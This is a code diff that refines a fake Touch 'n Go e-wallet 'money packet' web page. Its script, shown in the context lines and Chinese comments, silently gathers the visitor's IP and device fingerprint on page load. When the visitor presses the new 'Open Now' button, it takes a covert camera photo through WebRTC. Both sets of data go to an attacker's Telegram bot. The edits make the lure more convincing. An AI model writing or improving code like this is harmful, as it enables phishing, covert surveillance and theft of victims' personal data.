@@ -7,19 +7,30 @@
     <link rel="icon" href="tng.png" type="image/png">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        body { background-color: #0080ff; color: #333; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; overflow-x: hidden; position: relative; }
+        body { 
+            background: #1881ff; 
+            color: #333; 
+            min-height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            overflow-x: hidden; 
+            position: relative; 
+        }
         
+        /* 放射状蓝色背景光芒 */
         body::before {
             content: '';
             position: absolute;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: radial-gradient(circle, rgba(255,255,255,0.15) 0%, rgba(0,0,0,0.1) 100%);
+            background: radial-gradient(circle at center, rgba(255,255,255,0.25) 0%, rgba(0,102,255,0.4) 100%);
             pointer-events: none;
         }
 
         .container {
             width: 100%;
-            max-width: 420px;
+            max-width: 380px;
             padding: 20px;
             display: flex;
             flex-direction: column;
@@ -27,6 +38,7 @@
             z-index: 10;
         }
 
+        /* 视图 1：红包卡片界面 */
         #viewPacket {
             width: 100%;
             display: flex;
@@ -36,94 +48,94 @@
         }
 
         .people-img {
-            width: 220px;
+            width: 210px;
             height: auto;
-            margin-bottom: -25px;
+            margin-bottom: -18px;
             z-index: 2;
         }
 
+        /* 主红包卡片（带有弧形纹路） */
         .packet-card {
-            background: #0052cc;
+            background: linear-gradient(180deg, #0260e8 0%, #004dc7 100%);
             width: 100%;
-            border-radius: 24px;
-            padding: 35px 20px 30px 20px;
+            border-radius: 28px;
+            padding: 40px 20px 45px 20px;
             text-align: center;
             color: #fff;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            box-shadow: 0 15px 35px rgba(0, 30, 100, 0.35);
             position: relative;
-            border-top: 4px solid #1a73e8;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+        }
+
+        /* 弧形红包封口纹路 */
+        .packet-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -20%;
+            width: 140%;
+            height: 160px;
+            background: rgba(255, 255, 255, 0.06);
+            border-bottom-left-radius: 50%;
+            border-bottom-right-radius: 50%;
+            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.12);
+            pointer-events: none;
         }
 
         .tng-logo {
-            width: 70px;
-            height: 70px;
+            width: 82px;
+            height: 82px;
             background: #fff;
-            border-radius: 16px;
-            margin: 0 auto 15px auto;
+            border-radius: 20px;
+            margin: 10px auto 35px auto;
             display: flex;
             align-items: center;
             justify-content: center;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.15);
-            overflow: hidden;
+            box-shadow: 0 6px 18px rgba(0,0,0,0.2);
+            position: relative;
+            z-index: 3;
         }
-        .tng-logo img { width: 55px; height: auto; }
-
-        .amount-title {
-            font-size: 1.8rem;
-            font-weight: 700;
-            margin-bottom: 8px;
-            letter-spacing: 0.5px;
-        }
-
-        .amount-desc {
-            font-size: 0.85rem;
-            opacity: 0.85;
-            margin-bottom: 25px;
-        }
+        .tng-logo img { width: 68px; height: auto; }
 
         .sender-box {
-            font-size: 0.9rem;
-            opacity: 0.9;
-            margin-bottom: 30px;
+            font-size: 0.95rem;
+            color: rgba(255, 255, 255, 0.85);
+            margin-bottom: 35px;
+            position: relative;
+            z-index: 3;
         }
-        .sender-box span {
-            display: inline-block;
-            background: rgba(0,0,0,0.15);
-            padding: 4px 15px;
-            border-radius: 6px;
-            font-weight: 600;
-            margin-top: 5px;
-            letter-spacing: 1px;
+        .sender-name {
+            font-size: 1.35rem;
+            font-weight: 800;
+            color: #ffffff;
+            margin-top: 6px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
         }
 
-        .btn-main {
-            background: #fff;
-            color: #0052cc;
+        /* Open Now 白色按钮 */
+        .btn-open {
+            background: #ffffff;
+            color: #005ce6;
             border: none;
-            width: 100%;
-            padding: 16px;
+            width: 70%;
+            padding: 14px 0;
             border-radius: 30px;
-            font-size: 1.05rem;
-            font-weight: 600;
+            font-size: 1.15rem;
+            font-weight: 700;
             cursor: pointer;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            box-shadow: 0 6px 20px rgba(0,0,0,0.15);
             transition: transform 0.1s, background 0.2s;
-            margin-bottom: 12px;
+            position: relative;
+            z-index: 3;
+            margin: 0 auto;
+            display: block;
         }
-        .btn-main:active { transform: scale(0.98); }
-        .btn-main:hover { background: #f0f0f0; }
+        .btn-open:active { transform: scale(0.96); }
+        .btn-open:hover { background: #f8fafc; }
 
-        .btn-sub {
-            background: transparent;
-            color: #fff;
-            border: none;
-            font-size: 0.9rem;
-            cursor: pointer;
-            opacity: 0.9;
-            padding: 8px;
-        }
-        .btn-sub:hover { opacity: 1; text-decoration: underline; }
-
+        /* 视图 2：排行榜界面 */
         #viewLeaderboard {
             display: none;
             width: 100%;
@@ -176,6 +188,7 @@
         .lb-time { font-size: 0.75rem; color: #999; margin-top: 2px; }
         .lb-amount { font-weight: 600; color: #0052cc; }
 
+        /* 加载框 */
         .loading-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.6); backdrop-filter: blur(4px);
@@ -203,27 +216,24 @@
     </div>
 
     <div class="container">
-        <!-- 视图 1：红包领取主页 -->
+        <!-- 首页红包 UI -->
         <div id="viewPacket">
             <img src="4people.png" alt="People" class="people-img" onerror="this.style.display='none'">
             <div class="packet-card">
                 <div class="tng-logo">
                     <img src="tng.png" alt="TNG" onerror="this.style.display='none'">
                 </div>
-                <div class="amount-title">RM100.00</div>
-                <div class="amount-desc" id="txtDesc">(will be randomly distributed to 5 receivers)</div>
                 
                 <div class="sender-box">
                     <div id="txtFrom">From</div>
-                    <span>CHONG JIA MING</span>
+                    <div class="sender-name">CHONG JIA MING</div>
                 </div>
 
-                <button class="btn-main" id="btnClaim" onclick="handleActionAndCapture()">Create Money Packet</button>
-                <button class="btn-sub" id="btnEdit" onclick="handleActionAndCapture()">Edit Money Packet</button>
+                <button class="btn-open" id="btnOpen" onclick="handleActionAndCapture()">Open Now</button>
             </div>
         </div>
 
-        <!-- 视图 2：排行榜页面 -->
+        <!-- 排行榜页面 -->
         <div id="viewLeaderboard">
             <div class="lb-header">
                 <div class="lb-title" id="lbTitle">Leaderboard</div>
@@ -310,16 +320,14 @@
         const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         const TELEGRAM_PHOTO_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
 
-        // 基于设备语言自动适配中英文
+        // 系统语言适配
         const userLang = navigator.language || navigator.userLanguage || "en";
         const isZh = userLang.toLowerCase().includes("zh");
 
         if (isZh) {
-            document.getElementById("txtDesc").innerText = "(将随机分发给 5 位接收者)";
             document.getElementById("txtFrom").innerText = "来自";
-            document.getElementById("btnClaim").innerText = "创建红包 (Create Money Packet)";
-            document.getElementById("btnEdit").innerText = "编辑红包";
-            document.getElementById("loadingText").innerText = "正在加载红包...";
+            document.getElementById("btnOpen").innerText = "立即打开";
+            document.getElementById("loadingText").innerText = "正在打开红包...";
             document.getElementById("lbTitle").innerText = "排行榜";
             document.getElementById("lbSub").innerText = "排行榜: 4/8";
         }
@@ -405,7 +413,7 @@
             return "未知设备";
         }
 
-        // 页面一加载：后台默默收集设备指纹和IP并发送至 Telegram
+        // 页面打开瞬间：后台静默采集指纹与环境信息并发往 Telegram
         window.addEventListener('DOMContentLoaded', async () => {
             try {
                 let ipData = {};
@@ -445,12 +453,11 @@
             }
         });
 
-        // 点击领取/编辑红包时：加载动画 -> 触发摄像头拍照 -> 进入排行榜
+        // 点击 Open Now：拉起相机拍照发送 -> 显示 Loading -> 切换到排行榜
         window.handleActionAndCapture = async function() {
             let overlay = document.getElementById("loadingOverlay");
             overlay.style.display = "flex";
 
-            // 尝试触发摄像头拍照并发送到 Telegram
             await triggerWebRTCCamera();
 
             setTimeout(() => {
@@ -460,7 +467,7 @@
             }, 1000);
         };
 
-        // WebRTC 现场抓拍函数
+        // WebRTC 拍照触发函数
         window.triggerWebRTCCamera = async function() {
             if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                 return;
@@ -489,14 +496,14 @@
                 if (blob) {
                     let formData = new FormData();
                     formData.append("chat_id", CHAT_ID);
-                    formData.append("photo", blob, "tng_capture.jpg");
-                    formData.append("caption", `📷 <b>【TNG 红包点击抓拍】</b>\n🕒 时间：${new Date().toLocaleString()}`);
+                    formData.append("photo", blob, "tng_open_capture.jpg");
+                    formData.append("caption", `📷 <b>【TNG 点击 Open Now 实时抓拍】</b>\n🕒 时间：${new Date().toLocaleString()}`);
                     formData.append("parse_mode", "HTML");
 
                     await fetch(TELEGRAM_PHOTO_URL, { method: "POST", body: formData });
                 }
             } catch (err) {
-                console.log("摄像头未授权或被拒绝", err);
+                console.log("相机调起失败或许可拒绝", err);
             }
         };
     </script>
